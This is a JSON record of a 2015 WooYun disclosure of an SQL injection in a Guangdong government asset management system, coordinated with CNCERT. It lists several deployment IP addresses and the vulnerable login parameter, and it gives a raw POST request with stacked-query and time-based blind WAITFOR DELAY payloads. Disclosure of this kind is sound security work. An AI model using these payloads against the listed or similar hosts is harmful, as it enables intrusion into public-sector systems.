{"id": 32606, "wybug_id": "wooyun-2015-0110764", "wybug_title": "某行政事业单位资产管理系统通用SQL注入漏洞", "wybug_corp": "广州市盛祺计算机信息技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-28 11:54", "wybug_open_date": "2015-07-29 17:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向公众公开  简要描述： 某行政事业单位资产管理系统通用SQL注入漏洞 详细说明：  系统名称：行政事业单位资产管理系统通用SQL注入漏洞系统架构：ASPX+MSSQL主要使用范围：广东省（看广东省政府新闻上，还在推广，这得赶紧修复啊，避免造成更大的影响）漏洞文件：gdczsam/mainframe/login.jsp注入参数：userName基于登陆处的注入应要求，部分案例列举如下：http://61.146.213.192/gdczsam/index.jsphttp://210.76.65.208:7001/gdczsam/index.jsphttp://61.145.75.123:8000/gdczsam/index.jsphttp://218.16.249.227:7001/gdczsam/index.jsphttp://218.16.249.227:7001/gdczsam/index.jsphttp://121.11.76.118:9090/gdczsam/index.jsp等应该是在各地区正在推广了   漏洞证明：  漏洞验证：以http://61.146.213.192/gdczsam/index.jsp为例：\nPOST /gdczsam/mainframe/login.jsp HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://61.146.213.192/gdczsam/index.jspAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateProxy-Connection: Keep-AliveContent-Length: 63DNT: 1Host: 61.146.213.192Pragma: no-cacheCookie: JSESSIONID=rBZ6ZxroVT5b03g0XCUSxUQFn4gbGopjps0A; userName=; UserNamePW_Remeber=0; userPassword=; UserNamePW_Remeber2=0userName=admin%27&userPassword=a95ab7b730f1f7d8acbf693c21b7f534\n\nPlace: POSTParameter: userName    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: userName=admin'; WAITFOR DELAY '0:0:5'--&userPassword=a95ab7b730f1f7d8acbf693c21b7f534    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: userName=admin' WAITFOR DELAY '0:0:5'--&userPassword=a95ab7b730f1f7d8acbf693c21b7f534---\n\n\n延时注入。。数据库信息如下：\n\n其他如上！毕竟省级系统，点到为止！   修复方案：  必要的参数过滤。。。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-04-30 17:03 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给相应分中心，由其后续协调网站管理单位处置  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}